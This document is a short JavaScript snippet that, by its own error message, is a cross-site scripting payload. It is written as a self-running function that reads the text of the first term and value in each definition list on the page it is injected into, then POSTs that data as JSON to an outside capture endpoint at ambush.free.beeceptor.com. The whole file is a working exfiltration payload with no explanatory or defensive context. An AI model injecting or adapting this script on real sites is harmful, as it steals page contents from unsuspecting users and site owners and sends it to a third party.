(function () {
    try {
        const entries = {};
        document.querySelectorAll('dl').forEach(dl => {
            const keyElement = dl.querySelector('dt');
            const valueElement = dl.querySelector('dd');
            if (keyElement && valueElement) {
                const key = keyElement.innerText.trim();
                const value = valueElement.innerText.trim();
                entries[key] = value;
            }
        });

        fetch('https://ambush.free.beeceptor.com', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(entries)
        });
    } catch (e) {
        console.error('XSS script failed:', e);
    }
})();
